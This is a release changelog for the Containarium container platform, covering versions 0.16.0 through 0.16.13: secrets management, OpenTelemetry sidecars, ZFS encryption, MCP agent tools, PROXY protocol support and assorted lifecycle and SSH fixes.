- **Secrets master-keyfile operator runbook** ([#201](https://github.com/FootprintAI/Containarium/pull/201)) — `docs/SECRETS-OPERATIONS.md` documents `/etc/containarium/secrets.key` lifecycle: backup, restore, rotation. Companion to the v0.16.13 secrets management release.
- **Cluster-cutover runbook** ([#206](https://github.com/FootprintAI/Containarium/pull/206)) — `docs/CUTOVER-DEMO-INTO-PROD-SENTINEL.md` walks through migrating a standalone cluster into an existing sentinel as a `pool=demo` peer, with pre-flight, the `curl --resolve` keystone-verification before DNS changes, and a non-destructive rollback path within the DNS-TTL window.

### Breaking

- **`/sentinel/primaries` registration body**: the `base_domain` field (introduced in unreleased Phase 3) was renamed `base_domains` (string → array) as part of #207 to support multi-domain primaries. Any out-of-tree integration that POSTed JSON with the singular form needs to update. The CLI flags (`--public-base-domain` on `containarium daemon` and `containarium tunnel`) are backward-compatible: a single value still works; the change is that the flag is now repeatable. No live deployments shipped the singular wire format, so this is a clean cutover.

## [0.16.13] - 2026-05-16

Ships the **tenant secrets management API** end-to-end (CLI + MCP + REST + gRPC), plus the documentation Approvals that landed alongside it.

### Added

- **Tenant secrets management** ([#194](https://github.com/FootprintAI/Containarium/pull/194), [#195](https://github.com/FootprintAI/Containarium/pull/195), [#196](https://github.com/FootprintAI/Containarium/pull/196), [#197](https://github.com/FootprintAI/Containarium/pull/197), [#198](https://github.com/FootprintAI/Containarium/pull/198), [#199](https://github.com/FootprintAI/Containarium/pull/199)) — daemon-managed `set / get / list / delete / refresh` of tenant secrets (API keys, DB passwords, OAuth tokens). AES-256-GCM with `(username, name)` as AAD, master key auto-generated at `/etc/containarium/secrets.key` on first daemon start (mode 0400; back this up off-host). Stored as ciphertext in `containarium-core-postgres`; the daemon stamps decrypted values as `environment.<NAME>=<value>` on the LXC at every `CreateContainer` / `StartContainer`, so apps inside docker read them via compose `${VAR}` interpolation — same pattern as `--monitoring`. CLI: `containarium secrets {set,get,list,delete,refresh} <user> ...`. MCP: 5 new tools (count: 22 → 27). The 6-phase implementation from `docs/SECRETS-MANAGEMENT-DESIGN.md` (Approved) shipped in order: proto + crypto helper → Postgres store → server impl → env-var stamping → CLI → MCP.
- **Sidecar image is public on GHCR** ([#193](https://github.com/FootprintAI/Containarium/pull/193)) — `ghcr.io/footprintai/containarium-otel-sidecar:vX.Y.Z` is anonymously pullable now (org admin enabled public packages). The compose snippet from `containarium sidecar otel compose <user>` references GHCR directly; `make sidecar-build-otel` stays for dev iteration.

### Documentation

- **Platform sidecar pattern** ([#185](https://github.com/FootprintAI/Containarium/pull/185), [#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/PLATFORM-SIDECAR-DESIGN.md` (Approved). Generic primitive for cross-cutting concerns (telemetry, log shipping, file scanning, audit). Each sidecar is a small Docker image on GHCR, identity flows in via LXC-env compose interpolation, image versions track the Containarium project version.
- **OTel sidecar design** ([#184](https://github.com/FootprintAI/Containarium/pull/184), [#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/OTEL-AGENT-RELAY-DESIGN.md` (Approved). Pivoted from "Containarium installs systemd unit inside each LXC" to docker-compose-sidecar form. Closes the docker-in-LXC env-passthrough gap discovered while rolling `--monitoring` to prod ([#183](https://github.com/FootprintAI/Containarium/pull/183)).
- **Secrets management design** ([#194](https://github.com/FootprintAI/Containarium/pull/194), [#195](https://github.com/FootprintAI/Containarium/pull/195)) — `docs/SECRETS-MANAGEMENT-DESIGN.md` (Approved). Full design doc that drove the v0.16.13 implementation above.
- **Per-container ZFS encryption design** ([#178](https://github.com/FootprintAI/Containarium/pull/178), [#179](https://github.com/FootprintAI/Containarium/pull/179)) — `docs/ZFS-PER-CONTAINER-ENCRYPTION-DESIGN.md` (Approved). Per-tenant `encryptionroot` model with pluggable `KeyProvider`; five lifecycle hooks. Blocked on the cloud-side multi-tenancy work.

### Operator notes

- **Prod rollout of `--monitoring`** on `api`, `facelabor`, `pes`, `voicegpt`, `wordpress` (2026-05-16). All five are docker-in-LXC, so the LXC env is stamped but per-service docker passthrough is still up to each app team — see the new sidecar pattern for the zero-compose-change alternative.

## [0.16.12] - 2026-05-16

Two unrelated fills:

- **Sidecar image local-build stopgap** while GHCR is org-private — `make sidecar-build-otel` plus an updated compose-snippet preamble so operators aren't blocked on the registry-visibility change.
- **`ResizeContainer` end-to-end** — server has had it since v0.16.4; this release wires the client wrappers, replaces the remote-CLI stub with a real call, and adds the `resize_container` MCP tool. Tenants can now hot-resize CPU / memory / disk on a running container via CLI or MCP without an SSH-to-the-backend ritual.

### Added

- **`make sidecar-build-otel`** ([#190](https://github.com/FootprintAI/Containarium/pull/190)) — builds the otel-sidecar Docker image locally from `sidecars/otel-sidecar/`, tag matching `pkg/version`. The compose snippet `containarium sidecar otel compose <user>` now references the local tag (`containarium-otel-sidecar:vX.Y.Z`) and reminds the operator to run the make target. GHCR pipeline keeps running for authenticated org users + a future public flip.
- **`resize_container` MCP tool** + remote-CLI implementation + gRPC/HTTP client wrappers ([#191](https://github.com/FootprintAI/Containarium/pull/191)) — `containarium resize alice --memory 8GB --server …` (or the equivalent MCP call) now actually hot-resizes the container instead of returning "not yet implemented" with an SSH suggestion. At least one of `--cpu` / `--memory` / `--disk` is required; disk can only grow (server rejects shrinks). MCP tool count bumped 21 → 22.

## [0.16.11] - 2026-05-16

Lands the **platform sidecar pattern** as designed in [#185](https://github.com/FootprintAI/Containarium/pull/185) / [#186](https://github.com/FootprintAI/Containarium/pull/186): a small set of platform-published Docker images tenants compose into their LXC's stack to layer cross-cutting concerns (telemetry today; logs / scanning / audit next). The OTel sidecar is the first instance — tenants who'd had to plumb `OTEL_*` env passthrough across every compose service can now drop in a sidecar reference and let it stamp identity automatically.

This release also tags the first sidecar image release: `ghcr.io/footprintai/containarium-otel-sidecar:v0.16.11`. Image versions track the Containarium project version — daemon and sidecars move together.

### Added

- **`containarium-otel-sidecar` Docker image + GH Actions build pipeline** ([#187](https://github.com/FootprintAI/Containarium/pull/187)) — `sidecars/otel-sidecar/` directory ships a Debian-slim Dockerfile that wraps `otelcol-contrib v0.110.0` (matches the central collector). Entrypoint validates the four required identity env vars (`CONTAINARIUM_CONTAINER_ID`, `CONTAINARIUM_BACKEND_ID`, `CONTAINARIUM_TENANT_ID`, `OTEL_EXPORTER_OTLP_ENDPOINT`) and fail-closes with a docs-link message if any are missing. Baked-in config uses the `resource` processor to `upsert` platform-controlled `container.id`/`backend.id` (overrides app-claimed values for anti-spoofing) and `insert` tenant-overridable `service.namespace`/`service.version`. `.github/workflows/sidecars.yml` triggers on every `v*` tag and publishes three tags per release: `:v0.16.11` (immutable), `:v0.16` (minor moving), `:latest-stable`.

- **Daemon stamps split `CONTAINARIUM_*` env vars alongside `OTEL_RESOURCE_ATTRIBUTES`** ([#187](https://github.com/FootprintAI/Containarium/pull/187)) — `pkg/core/container/otel.go` now writes three additional env keys (`CONTAINARIUM_CONTAINER_ID`, `CONTAINARIUM_BACKEND_ID`, `CONTAINARIUM_TENANT_ID`) on `--monitoring=true` LXCs. The split form feeds the sidecar's compose `${VAR}` interpolation; the legacy comma form keeps non-sidecar apps (native LXC processes, agent-box, etc.) working unchanged. `ToggleMonitoring disable` cleans both forms.

- **`containarium sidecar otel compose <username>` CLI** ([#188](https://github.com/FootprintAI/Containarium/pull/188)) — prints a ready-to-paste docker-compose snippet that adds the OTel sidecar to the named LXC's stack. Output uses `${VAR}` interpolation against the LXC's env (not hardcoded values) so it stays in sync as Containarium re-stamps via ToggleMonitoring / MoveContainer; current literal values appear as inline comments for verification. Read-only — never writes to tenant files (decision P2 of the platform-sidecar design). Image tag in the output tracks the project version.

### Documentation

- **Platform sidecar pattern** ([#185](https://github.com/FootprintAI/Containarium/pull/185), [#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/PLATFORM-SIDECAR-DESIGN.md` (Approved) establishes the generic primitive: image contract (read identity from env, share netns/filesystem with target, fail-closed on missing identity), naming convention, GHCR registry, version-tracking-project policy, CVE response calendar. `log-sidecar` / `scanner-sidecar` / `audit-sidecar` follow this contract when shipped.
- **OTel sidecar image** ([#186](https://github.com/FootprintAI/Containarium/pull/186)) — `docs/OTEL-AGENT-RELAY-DESIGN.md` (Approved). Rewritten from the rejected "Containarium installs systemd unit inside each LXC" v0 draft to the docker-compose-sidecar form. Documents the baked-in config, override semantics, and lifecycle.

## [0.16.10] - 2026-05-15

Small follow-on to v0.16.9. Closes the `ToggleMonitoring` v2 TODO from the approved OTel design so operators can retrofit OTel onto containers that were created before `--monitoring` existed.

### Added

- **`ToggleMonitoring` RPC for live OTel enable/disable** ([#181](https://github.com/FootprintAI/Containarium/pull/181)) — `containarium monitoring enable|disable <username>` (CLI) / `toggle_monitoring` (MCP) / `POST /v1/containers/{username}/monitoring` (REST). Stamps the four `OTEL_*` env vars onto the LXC's Incus config and restarts the container so the new env reaches the app process. Disable path uses a new `incus.Client.UnsetEnv` that deletes the keys rather than setting empty strings (some OTel SDKs flag empty `OTEL_EXPORTER_OTLP_ENDPOINT` as misconfig). Refuses core containers. Use this to retrofit monitoring onto exposed-port containers created before v0.16.9.

## [0.16.9] - 2026-05-15

This release lands **application-emitted OpenTelemetry** (per-container opt-in, metrics-only v1) and **pool-level ZFS native encryption** for self-hosters. Together they close two long-standing observability + at-rest-encryption gaps; both are off-by-default so existing deployments inherit current behavior.

### Added

- **Per-container `--monitoring` flag for OTel app telemetry** ([#175](https://github.com/FootprintAI/Containarium/pull/175)) — `containarium create alice --monitoring` (or `monitoring: true` over MCP/proto) stamps `OTEL_EXPORTER_OTLP_ENDPOINT`, `OTEL_SERVICE_NAME`, `OTEL_EXPORTER_OTLP_PROTOCOL`, and `OTEL_RESOURCE_ATTRIBUTES` (container.id, backend.id) into the new LXC's environment via Incus `environment.*` config keys. Apps that pull in any OTel SDK auto-discover the endpoint and start emitting; apps without an SDK ignore the vars. Default off — opt-in per container. `AdoptMigratedContainer` re-stamps env vars after `MoveContainer` so migrated containers point at the destination VM's collector.

- **Core OTel collector LXC + cardinality guard + IP map** ([#176](https://github.com/FootprintAI/Containarium/pull/176)) — new `containarium-core-otelcollector` LXC running `otelcol-contrib v0.110.0` is provisioned alongside VictoriaMetrics on daemon startup. Boot priority 75, 1GB ZFS reservation, OTLP/HTTP :4318 + gRPC :4317 receivers, `otlphttp` exporter to local VM at `:8428/opentelemetry`. Anti-spoofing via `attributes/identity` processor stamping `source.ip` from `client.address`. Cardinality guard drops a default PII list (`request_id`, `trace_id`, `user_email`, `session_id`, `correlation_id`); operators extend via new `--otel-drop-labels=a,b,c` daemon flag. Daemon pushes `/var/lib/containarium/container_ips.json` to the collector on every container create/delete/adopt (v1 maintains the JSON; v2 will materialize `container.id` once a custom processor or auto-regenerated OTTL lands). Full design at `docs/OTEL-COLLECTOR-DESIGN.md`.

- **Pool-level ZFS native encryption (opt-in)** ([#177](https://github.com/FootprintAI/Containarium/pull/177)) — both install paths accept an optional keyfile flag that creates the data ZFS pool with `encryption=on`, `keyformat=raw`, `keylocation=file://<path>`. Every container dataset inherits encryption from the parent pool; the daemon needs no code change. GCE: new `zfs_encryption_keyfile` terraform module variable. Bare-metal: new `--zfs-encryption-keyfile PATH` flag on `setup-gpu-host.sh`. The keyfile auto-generates on first run (32 random bytes, `chmod 0400`), with a loud "back it up off-host" warning. Combine with GCP CMEK on the boot disk for defense in depth. Per-container/per-tenant encryption stays deferred to cloud multi-tenancy work; `docs/ZFS-PER-CONTAINER-ENCRYPTION-DESIGN.md` ([#178](https://github.com/FootprintAI/Containarium/pull/178), [#179](https://github.com/FootprintAI/Containarium/pull/179)) is Approved and waiting for that to land.

### Documentation

- **OTel collector design** ([#173](https://github.com/FootprintAI/Containarium/pull/173), [#174](https://github.com/FootprintAI/Containarium/pull/174)) — `docs/OTEL-COLLECTOR-DESIGN.md` documents the metrics-only v1 (per-container `--monitoring`, anti-spoofing via `attributes/identity`, cardinality guard, source-IP attribution v1/v2 split). Status: Approved with all 5 open questions resolved.
- **Per-container ZFS encryption design** ([#178](https://github.com/FootprintAI/Containarium/pull/178), [#179](https://github.com/FootprintAI/Containarium/pull/179)) — `docs/ZFS-PER-CONTAINER-ENCRYPTION-DESIGN.md` captures the deferred multi-tenancy path: `KeyProvider` interface, per-tenant `encryptionroot` model, five daemon lifecycle hooks, `MoveContainer` integration with `KeyRef` migration metadata. Status: Approved, blocked on cloud multi-tenancy.

## [0.16.8] - 2026-05-14

This release is a punch-list of robustness fixes — six bug fixes / small features that collectively close several silent-failure modes in the container lifecycle, MCP surface, and telemetry path. Everything in here came out of yesterday's demo-recording session and the cleanup that followed; each item was reproduced live before being fixed.

### Fixed

- **`--network=host` for rootless podman in `app deploy`** ([#166](https://github.com/FootprintAI/Containarium/pull/166)) — `runContainer` switched from `-p <port>:<port>` to `--network=host`. Rootless podman publishes `-p` ports only in the user's slirp4netns namespace, invisible to the LXC's main netns where Caddy lives, producing 502s on the public hostname. `--network=host` makes the bound port reachable on the LXC's eth0 directly. Trade-off: one-app-per-LXC port isolation, which matches Containarium's actual deployment model.

- **`DeleteContainer` cascade cleanup** ([#167](https://github.com/FootprintAI/Containarium/pull/167)) — deleting a container used to remove the LXC and leave six other resources orphaned: route store row, Caddy srv0 route (resurrected by `RouteSyncJob`'s 5s tick), Caddy TLS automation subject, host-side Linux user account, `/home/<user>` dir, and the sshpiper entry (auto-reaped). The cascade now runs inside `DeleteContainer`: route store first (so the sync job doesn't fight it), then TLS subject, then `userdel --remove`. sshpiper config reaps on the next keysync (2 min). Closes the "public hostname still 502s after delete" bug.

- **`AddSSHKey` / `RemoveSSHKey` RPCs no longer return "not implemented yet"** ([#168](https://github.com/FootprintAI/Containarium/pull/168)) — the proto declared `POST /v1/containers/{username}/ssh-keys` and `DELETE /v1/containers/{username}/ssh-keys/{ssh_public_key}` and both returned 500. The intended recovery path when an ephemeral key was lost (generate new key, POST the public half, ssh in) was unreachable. New helpers in `pkg/core/container` write the host-side `/home/<user>/.ssh/authorized_keys` atomically (temp + rename, 0600 mode, idempotent). Sentinel keysync propagates the new key within ~2 minutes.

- **MCP tool error surfacing** ([#157, prior release](https://github.com/FootprintAI/Containarium/pull/157)) — task #62 was already shipped; bookkeeping closed it this release. Tool execution errors now appear in both `message` and `data` fields of the JSON-RPC error response so clients that render only the top-level `message` field (Claude Code) see the actual diagnostic instead of a generic "Tool execution failed."

- **Conntrack event channel no longer saturates** ([#170](https://github.com/FootprintAI/Containarium/pull/170)) — the Linux conntrack monitor was subscribing to NEW + UPDATE + DESTROY groups. The kernel emits UPDATE events ~1Hz per active connection plus on every TCP state transition, so even tens of connections produce thousands of events per second, filling the 8192-buffered channel within seconds. Now subscribes only to NEW + DESTROY — interim byte counts come from `Snapshot()` on demand, final byte counts arrive with DESTROY. ~100x reduction in event volume.

### Added

- **`CONTAINARIUM_JWT_TOKEN_FILE` for restart-free token rotation** ([#169](https://github.com/FootprintAI/Containarium/pull/169)) — alternative to `CONTAINARIUM_JWT_TOKEN`. When set, the MCP server's Client re-reads the file on every API request, so rotating the token is `mv newtoken oldpath` — no MCP process restart required. Empty/missing file surfaces a pre-flight error rather than sending an empty Bearer to the server. Long-running MCP clients (Claude Code, Cursor, etc.) now survive operator-side token rotation without manual intervention.

## [0.16.7] - 2026-05-14

### Fixed

- **Sentinel simple-proxy mode: real client IP via userspace PROXY v2 forwarder** ([#161](https://github.com/FootprintAI/Containarium/pull/161)) — `--proxy-protocol` was a no-op in simple-proxy deployments (single GCP spot VM behind the sentinel, e.g. the demo cluster). Those deployments use kernel iptables DNAT, which can't inject a PROXY v2 frame, so the downstream Caddy saw the post-MASQUERADE bridge gateway IP (`10.0.3.1`) instead of the real client IP. Now when `--proxy-protocol` is set on the sentinel and ConnMux isn't owning `:443` (i.e. tunnel/multi-pool modes that already had PROXY v2 via the SNI router), the sentinel spins up a userspace TCP forwarder on `:80`/`:443` that dials the backend and prepends a PROXY v2 header. Lab/prod (ConnMux path) behavior is unchanged.
- **MCP `create_container`: auto-save ephemeral private key** ([#160](https://github.com/FootprintAI/Containarium/pull/160)) — when the agent omits `ssh_keys`, the MCP server generates an ed25519 keypair locally, installs the public half on the container, and returns the private half in the response. It now also writes the key to `$CONTAINARIUM_KEYS_DIR` (default `$HOME/.containarium/keys/<username>`) with mode 0600 itself, so the agent no longer has to remember the save step — losing it between the create call and the next ssh/push/sync call was a real failure mode (the daemon doesn't keep a copy server-side).

## [0.16.6] - 2026-05-13

### Fixed

- **`ensureHTTPApp` no longer 409s on every daemon startup** ([#157](https://github.com/FootprintAI/Containarium/pull/157)) — `ensureHTTPApp` strict-decoded the Caddy `/config/apps/http` response into the typed `CaddyHTTPApp`, whose `Handle []CaddyHandler` is an interface slice that `encoding/json` cannot unmarshal into. On every daemon startup where Caddy already had a non-empty http app the decode failed, the code fell through to a PUT that returned `409 key already exists: http`, and the daemon silently lost every Caddy update that depended on `EnsureServerConfig` having succeeded — notably the TLS subject + `srv0` route for a newly-connected tunnel-promoted pool primary. Probe with `map[string]json.RawMessage` instead.

## [0.16.5] - 2026-05-12

This release lands the **MCP-first agent dev loop**: an agent (Claude Code, Cursor, Cline, …) can now create a container, ship code into it via real `git push`, expose it on a public hostname, run security scans, and diagnose failures — all through tools that share Go entry points with their CLI counterparts. Plus the `pkg/core` extraction that makes the cloud-daemon (separate repo) possible.

(v0.16.4 was tagged but its CHANGELOG entry was skipped; this release covers all changes since v0.16.3.)

### Added

#### MCP tool surface (the headline)

- **`debug_container`** ([#139](https://github.com/FootprintAI/Containarium/pull/139)) — one-call diagnostic for SSH failures. Inspects host-side state the agent can't see (Linux user account presence, shell wrapper existence, recent sshd journal lines matching the user), returns a structured `{containerState, hostUserExists, hostUserShell, hostUserShellExists, recentSshdRejections, likelyCause, nextActions, sourceRepo, daemonVersion}`. The pre-PR session's SSH spiral was the motivating case: every "Connection closed" had a real explanation in the daemon, just nowhere visible to the caller.
- **`push` + `sync`** ([#150](https://github.com/FootprintAI/Containarium/pull/150), [#152](https://github.com/FootprintAI/Containarium/pull/152)) — two ways to ship code into a container.
  - `push`: real `git push` over SSH against a container-hosted bare repo at `~/work.git`, with a post-receive hook that checks out the working tree and runs an optional `deploy_cmd` (Heroku-style release flow). First call auto-bootstraps the bare repo + hook + local git remote `containarium-<user>`; subsequent calls just `git push`. Vanilla `git push containarium-<user> main` from any local clone works too.
  - `sync`: rsync-style mirror — ships content-hash delta of the working dir, including `.git/` so committed history + uncommitted modifications + untracked files + stash refs all carry over. `--delete` opt-in, sensible exclude defaults (`node_modules/`, `.terraform/`, `__pycache__`, `.env*`, ...).
- **`security_scan` + `security_findings` + `security_remediate`** ([#151](https://github.com/FootprintAI/Containarium/pull/151)) — agent-driven security workflow over the daemon's existing ClamAV / pentest / ZAP subsystems. Normalized cross-scanner finding shape with `kind`, `severity`, `title`, `target`, `fixAvailable`. `security_remediate` calls the daemon's existing `RemediatePentestFinding` (one-shot package upgrade); ClamAV/ZAP findings surface as `fixAvailable: false` until quarantine/sanitizer flows ship. Tool descriptions emphasize **operator-invoked one-shot use** — the hosted continuous variant is a cloud-only feature ([cloud PRD](https://github.com/FootprintAI/Containarium-cloud), `prd/cloud/security-patch-agent.md`).
- **`sync_ssh_config`** ([#130](https://github.com/FootprintAI/Containarium/pull/130)) — generate a self-contained `~/.containarium/ssh_config` for every reachable container; one-time `Include ~/.containarium/ssh_config` line in `~/.ssh/config` and then `ssh <name>` works directly.
- **`list_routes`** ([#156](https://github.com/FootprintAI/Containarium/pull/156)) — read-side counterpart to `expose_port`. Lists the proxy routes currently registered on the sentinel with their target container IP+port, active state, and app metadata. Optional `username` + `active_only` filters. Closes the audit gap so agents can answer "is this hostname already taken?" without ssh-ing in.
- **`get_backend`** ([#124](https://github.com/FootprintAI/Containarium/pull/124)) — fetch a single backend by ID with the same fields as `list_backends`.
- **`create_container` ephemeral keypair generation** ([#130](https://github.com/FootprintAI/Containarium/pull/130)) — when `ssh_keys` is omitted, generate an ed25519 keypair client-side, install the public half, return the private half in the response with a ready-to-paste `ssh -i …` command using `$CONTAINARIUM_SENTINEL_HOST`.
- **MCP tool descriptions are now agent-discovery affordances** ([#130](https://github.com/FootprintAI/Containarium/pull/130), [#147 conventions](https://github.com/FootprintAI/Containarium/pull/147)) — `create_container`'s description points at `push` / `sync` / `debug_container` / `expose_port` / `sync_ssh_config` so agents discover the full workflow from a single tool listing.

#### agent-box (in-the-box MCP)

- **`process_start` / `process_list` / `process_kill`** ([#126](https://github.com/FootprintAI/Containarium/pull/126)) — Manage background processes inside a Containarium box (dev servers, long-running tests, etc.) without spawning shells.
- **`tail_log`** ([#123](https://github.com/FootprintAI/Containarium/pull/123)) — Watch a log file as it grows; tool emits new content with metadata so the agent can decide when to stop.
- **MCP Roots support** — agent-box's filesystem operations align with the MCP client's workspace roots, matching the upstream `modelcontextprotocol/servers` reference behavior.

#### Demo cluster as a shipped artifact

- **`terraform/gce-demo/`** ([#127](https://github.com/FootprintAI/Containarium/pull/127)) — reproducible demo cluster (sentinel + spot backend) any operator can stand up in ~7 minutes. Consumes the shared `terraform/modules/containarium/` module; defaults are sized for the recorded-demo flow.

#### Cloud encryption posture

- **CMEK opt-in in the terraform module** ([#142](https://github.com/FootprintAI/Containarium/pull/142)) — new `kms_key_self_link` variable wires customer-managed encryption keys to backend boot disk, persistent data PD, and sentinel boot disk. Empty (default) = Google-managed-keys, no behavior change.
- **At-rest encryption posture doc** ([#143](https://github.com/FootprintAI/Containarium/pull/143)) — `docs/SECURITY-ENCRYPTION-AT-REST.md` documents what we encrypt today, what we don't, who holds the keys, and a vendor-questionnaire cheatsheet. Pairs with the cloud-side per-tenant encryption PRD (drafted in the Containarium-cloud repo).

#### Architecture / refactor

- **`pkg/core/` extraction** ([#138](https://github.com/FootprintAI/Containarium/pull/138) consolidating #133–#137) — `internal/container`, `internal/incus`, `internal/network`, `internal/ostype`, `internal/stacks`, `internal/coresys`, `internal/expose`, `internal/ospkg` all moved to `pkg/core/`, with `Backend` / `Store` interfaces extracted so the cloud-daemon (separate repo) can consume the same core via Go module import. ~9,350 LOC moved; no behavior change. Backend interface extends to 21+ methods covering lifecycle, exec, files, config, devices, labels, server info, metrics; consumers depend on the interface (or narrower subsets declared at the call site) for mockability. Package-level `doc.go` files added per `pkg/core` package ([#148](https://github.com/FootprintAI/Containarium/pull/148)).

#### Conventions

- **CLAUDE.md: proto-first + strong-typing** ([#147](https://github.com/FootprintAI/Containarium/pull/147)) — codifies the contract-first convention (`.proto` → buf generate → gRPC stubs + grpc-gateway REST shim + OpenAPI doc + typed client) and bans hand-rolled `net/http` handlers for customer-facing endpoints. Companion strong-typing rule rejects bare strings where proto enums fit and `map[string]interface{}` where structs do.

### Fixed

- **MCP error messages now reach the operator** ([#153](https://github.com/FootprintAI/Containarium/pull/153)) — `handleToolsCall` previously returned a constant `"Tool execution failed"` in JSON-RPC's `message` field and the actual `err.Error()` in `data`. Most MCP clients (including Claude Code) only render `message`, so every tool failure looked identical. Now the err string lands in both.
- **Sentinel upstream key rotation no longer strands existing containers** ([#140](https://github.com/FootprintAI/Containarium/pull/140)) — when the sentinel VM was replaced (terraform `apply -replace`) it generated a new upstream keypair and pushed the new pubkey to backend via `POST /authorized-keys/sentinel`. The previous handler appended-if-missing, which left every existing container's `authorized_keys` with the OLD sentinel pubkey alongside (or, in the live failure, INSTEAD of) the new one. Handler now replaces the `# sshpiper sentinel upstream key` marker block instead of appending; idempotent on no-op; atomic via temp file + rename. Response gains a `rotated` counter for operator observability.
- **Demo cluster SSH path now works first-shot** ([#132](https://github.com/FootprintAI/Containarium/pull/132)) — three independent root causes were stacking and preventing the agent-driven demo flow from ever completing:
  - `IdentitiesOnly=yes` + `PreferredAuthentications=publickey` now baked into MCP `create_container`'s response ssh hint. Without them, OpenSSH offered every key in `~/.ssh/`; sshpiper's failtoban counted each rejected offer toward the ban budget.
  - sshpiperd failtoban tuned from `--max-failures 20` / `--ban-duration 1h` to `100` / `5m` — appropriate for an agent's pace, not an attacker's.
  - `terraform/modules/containarium/scripts/startup-spot.sh` now installs `/usr/local/bin/containarium-shell` + sudoers + `/etc/shells` entry + sshd Match block at deploy time. The daemon creates user accounts with `shell=containarium-shell`; the wrapper had never been installed, so sshd refused every login with "User X not allowed because shell /usr/local/bin/containarium-shell does not exist." This had been silently broken since the demo cluster's first deploy.
- **JWT-authenticate `/v1/backends`** ([#122](https://github.com/FootprintAI/Containarium/pull/122)) — endpoint was unauthenticated.
- **`postgresPassthroughStore` unexported + dead helpers removed** ([#144](https://github.com/FootprintAI/Containarium/pull/144), [#146](https://github.com/FootprintAI/Containarium/pull/146)) — `PassthroughStore` is the public interface; the postgres implementation is now lowercase + internal. `FindCoreContainers`, `HasRole` removed.
- **DI cleanup for `incus.Backend`** ([#141](https://github.com/FootprintAI/Containarium/pull/141)) — post-extraction follow-ups: `container.Manager` takes `incus.Backend` (interface) instead of `*incus.Client`; `Backend` interface extends to cover `UpdateContainerConfig` and `GetRawInstance`.
- **Transfer tools UX** ([#154](https://github.com/FootprintAI/Containarium/pull/154)) — `~/` in `remote_path` is now expanded to `/home/<user>/` (previously created a literal `~` directory); `sync` excludes `.env*` by default to prevent silently clobbering per-environment config.
- **`gce-demo` first-deploy fixes** ([#128](https://github.com/FootprintAI/Containarium/pull/128), [#129](https://github.com/FootprintAI/Containarium/pull/129)) — Zabbly incus package renames (`incus-tools` → `incus`), stale ZFS pool cleanup on the fresh-install branch, binary URL derived from `containarium_version`, `spot_vm_external_ip=true` so apt-install works pre-Cloud-NAT, smoke-test script fixes.
- **`gateway/keys_handler` gosec hardening** — `#nosec G304` annotations with rationale on legitimate path-construction sites; `#nosec G204` on `exec.Command` calls whose args are argv-only (not shell-evaluated); unhandled-error fix on `json.NewEncoder().Encode()` (intentional discard now explicit). Cleared all gosec findings.

### Internal

- 14 staging branches deleted post-merge (`extraction/phase-1` through `extraction/phase-5`, `merge/extraction-into-main`, plus per-feature branches once their PRs landed). Main is now the only long-running branch.

## [0.16.3] - 2026-05-09

### Added
- **PROXY protocol v2 support — real client IP propagation through TLS-passthrough hops.** Containers behind the sentinel previously saw only the immediate proxy peer (`X-Forwarded-For: ::1` for the loopback hop). Now, with `containarium sentinel --proxy-protocol` and `containarium daemon --proxy-protocol --proxy-protocol-trusted=<sender-CIDR>`, every hop carries a PROXY v2 header so the daemon's HTTP server can recover the real client address and emit an accurate `X-Forwarded-For` to upstream containers. See [docs/PROXY-PROTOCOL.md](docs/PROXY-PROTOCOL.md). ([#105](https://github.com/FootprintAI/Containarium/pull/105), [#106](https://github.com/FootprintAI/Containarium/pull/106), [#107](https://github.com/FootprintAI/Containarium/pull/107), [#108](https://github.com/FootprintAI/Containarium/pull/108))
  - **Sentinel side** (#105): `WriteProxyV2` hand-rolled IPv4/IPv6 PROXY v2 encoder; `--proxy-protocol` CLI flag (off by default); header injected in `buildSNIRoutingHandler` before the bidirectional `io.Copy`. Covers all three forwarding sub-paths (yamux tunnel, in-VPC TCP dial, fallback). Real-Caddy e2e gated by `proxyproto_real_caddy` build tag; CI workflow `proxyproto-e2e.yml`.
  - **Daemon srv0 wrapper** (#106): `--proxy-protocol` and `--proxy-protocol-trusted` CLI flags; `ProxyManager.EnableProxyProtocol(trustedCIDRs)` installs a `[proxy_protocol, tls]` `listener_wrappers` chain plus `trusted_proxies` on the running Caddy. Empty/wildcard CIDR lists are rejected. Uses atomic `getFullConfig` + `loadConfig` so other srv0 fields (`listen`, `routes`, `automatic_https`, etc.) are preserved.
  - **Daemon caddy-l4 wrapping-aware lifecycle** (#107): the L4 server is produced in pattern B shape (one outer route with handlers `[layer4.handlers.proxy_protocol, layer4.handlers.subroute]`) when `--proxy-protocol` is set. `ActivateL4`, `getRoutes`, `putRoutes` are all wrapping-aware so `RouteSyncJob`'s CRUD operations on the inner subroute don't undo the wrapper. SNI passthrough routes inside the subroute keep working both with and without a leading PROXY header (deploy-gap safe). Catchall to the HTTP server emits `proxy_protocol: "v2"` so srv0's listener_wrapper can recover the source.

## [0.16.2] - 2026-05-08

### Fixed
- **`containarium-shell` breaks collaborator SSH logins** (`scripts/setup-peer-user.sh`): The shell script derived the target container as `${USERNAME}-container`, so a collaborator account `voice-dev-container-test` resolved to `voice-dev-container-test-container` (nonexistent), producing `Error: Container not found` on every login. Collaborator accounts follow the `<owner>-container-<collaborator>` naming pattern; the container is `<owner>-container`. Fix: if the primary container lookup fails, strip the trailing `-<collaborator>` suffix with `${USERNAME%-*}` and retry. Regular owner accounts (`voice-dev` → `voice-dev-container`) are unaffected. Existing deployments must re-push the script to each node (GCP spot VM and peer nodes).

## [0.16.1] - 2026-05-06

### Fixed
- **Jump server account missing sudoers entry** (`internal/container/jump_server.go`): `CreateJumpServerAccount` (the path used when the daemon auto-creates a container's host user) wrote `useradd` and the SSH key but never wrote `/etc/sudoers.d/containarium-<user>`. The user's `containarium-shell` then hit a password prompt on every SSH because `sudo incus exec` had no NOPASSWD rule. `EnsureJumpServerAccount` (a separate entry point) already had the sudoers write; this brings the primary path to parity. Symptom: `ssh <user>` returned `[sudo] password for <user>:` and hung. Existing host users on running daemons stay broken until the operator writes the sudoers file manually (see `setup-peer-user.sh`) or the daemon recreates them.

## [0.16.0] - 2026-05-06

### Added
- **Multi-pool architecture** — One sentinel can now front multiple independent Containarium clusters, each with its own primary VM, peers, core stack, and subdomain. See [docs/MULTI-POOL.md](docs/MULTI-POOL.md).
  - **Pool tag on peers** — `containarium tunnel --pool=<name>` and `setup-peer.sh --pool=<name>` propagate a pool tag through the tunnel handshake to `TunnelSpot` and `Backend`. `GET /sentinel/peers?pool=<name>` filters by tag (omitting the param keeps the back-compat behavior of returning all peers).
